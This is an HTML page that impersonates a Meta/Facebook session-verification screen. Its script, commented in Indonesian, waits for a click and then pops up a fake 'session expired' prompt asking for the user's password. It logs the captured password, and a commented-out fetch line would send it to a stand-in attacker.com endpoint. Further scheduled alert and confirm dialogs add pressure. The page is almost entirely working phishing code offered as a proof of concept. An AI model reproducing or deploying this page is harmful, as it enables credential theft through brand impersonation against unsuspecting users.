<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Meta Session Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #1877f2; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1877f2; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #166fe5; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Meta Session Verification</h2>
  <p>Click the button below to verify your session. You will be prompted to re-enter your password.</p>
  <button id="startBtn">Verify Session</button>
  <div id="status">[*] Ready...</div>
</div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[Dialog Persistence] " + msg);
  }

  // ============================================
  // 1. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', function() {
    log("[*] Scheduling persistent dialog...");

    // ============================================
    // A. JADWALKAN DIALOG SETELAH 5 DETIK
    // ============================================
    setTimeout(function() {
      // Dialog modal yang menyerupai UI Meta
      var password = prompt("Session expired. Enter your password to continue:");
      
      if (password) {
        log("[+] Password captured: " + password);
        // Kirim ke server (opsional)
        // fetch('https://attacker.com/steal', { method: 'POST', body: password });
      } else {
        log("[-] User cancelled the prompt.");
      }
    }, 5000); // 5 detik setelah klik

    // ============================================
    // B. JADWALKAN DIALOG KEDUA (CADANGAN)
    // ============================================
    setTimeout(function() {
      alert("Your session has been locked. Please close this dialog and re-open the app to verify.");
    }, 10000); // 10 detik

    // ============================================
    // C. JADWALKAN CONFIRM (OPSIONAL)
    // ============================================
    setTimeout(function() {
      var confirmResult = confirm("Your session has expired. Do you want to re-login?");
      if (confirmResult) {
        log("[+] User clicked OK on confirm dialog.");
      }
    }, 15000); // 15 detik

    log("[+] Dialogs scheduled: 5s (prompt), 10s (alert), 15s (confirm)");
  }, { once: true });

})();
</script>

</body>
</html>
